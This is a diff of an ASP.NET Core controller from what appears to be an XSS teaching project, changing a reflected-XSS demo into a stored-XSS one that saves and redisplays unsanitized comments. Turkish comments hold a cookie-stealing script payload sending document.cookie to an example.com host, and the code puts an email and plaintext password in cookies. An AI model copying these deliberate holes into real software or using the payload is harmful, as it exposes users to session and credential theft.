@@ -15,25 +15,39 @@ namespace XSS.Web.Controllers
 
         public IActionResult CommentAdd()
         {
-            HttpContext.Response.Cookies.Append("email","ahmetsarikaya0696@gmail.com");
-            HttpContext.Response.Cookies.Append("password","1234");
+            HttpContext.Response.Cookies.Append("email", "ahmetsarikaya0696@gmail.com");
+            HttpContext.Response.Cookies.Append("password", "1234");
+
+            if (System.IO.File.Exists("comment.txt"))
+            {
+                ViewBag.comment = System.IO.File.ReadAllLines("comment.txt");
+            }
             return View();
         }
 
         [HttpPost]
         public IActionResult CommentAdd(string name, string comment)
         {
-            // Datayı Validation yapmadan direkt gönderdiğimizde XSS ' e açık hale getirmiş oluyoruz.
-            // Datayı HtmlSanitizer ile temizleyerek ViewBag'e göndermeliyiz
+            #region Reflect XSS
+            //// Datayı Validation yapmadan direkt gönderdiğimizde XSS ' e açık hale getirmiş oluyoruz.
+            //// Datayı HtmlSanitizer ile temizleyerek ViewBag'e göndermeliyiz
+            //ViewBag.name = name;
+            //ViewBag.comment = comment;
+            //// XSS ' e açık bir uygulamada aşağıdaki script tagi yazılarak cookieler okunabilir.
+            //// <script>alert(document.cookie)</script>
+            //// <script>new Image().src="https://www.example.com/readcookie?accouninfo="+document.cookie</script> ile cookiler bir servera gönderilebilir.
+
+            //// Encode edilmiş kod
+            //// <span>&lt;script&gt;alert(&#x27;alert&#x27;)&lt;/script&gt;</span> 
+            //return View(); 
+
+            #endregion
+
             ViewBag.name = name;
             ViewBag.comment = comment;
-            // XSS ' e açık bir uygulamada aşağıdaki script tagi yazılarak cookieler okunabilir.
-            // <script>alert(document.cookie)</script>
-            // <script>new Image().src="https://www.example.com/readcookie?accouninfo="+document.cookie</script> ile cookiler bir servera gönderilebilir.
 
-            // Encode edilmiş kod
-            // <span>&lt;script&gt;alert(&#x27;alert&#x27;)&lt;/script&gt;</span> 
-            return View();
+            System.IO.File.AppendAllText("comment.txt", $"{name} - {comment}\r\n");
+            return RedirectToAction(nameof(CommentAdd));
         }
 
         public IActionResult Index()
